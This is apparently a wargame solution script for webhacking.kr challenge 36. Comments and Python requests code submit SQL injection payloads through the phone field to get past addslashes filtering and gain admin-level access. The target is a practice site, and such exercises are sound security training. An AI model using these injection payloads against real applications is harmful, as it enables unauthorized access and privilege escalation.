# |  id (INT)  |   phone (INT)  |    lv ('guest','admin')   |
# $_POST['phone'] = addslashes($_POST['phone']);
# if(strlen($_POST['phone'])>=20) exit("Access Denied");
# id=56&phone=2,concat(70,66))--+&lid=&lphone=
# id=nimda&phone=0,reverse(id))--+&lid=nimda&lphone=0


import requests
from phpsessid import cookies
url = 'https://webhacking.kr/challenge/web-36/index.php'
data = {'id':'44', 'phone':'44,\'asdf\')--\r'}
response = requests.post(url, data=data, cookies=cookies)

data = {'lid':'44', 'lphone':'44'}
response = requests.post(url, data=data, cookies=cookies)
print(response.text)

# did in burp-suite, couldn't register over
# here due to some encoding errors perhaps.

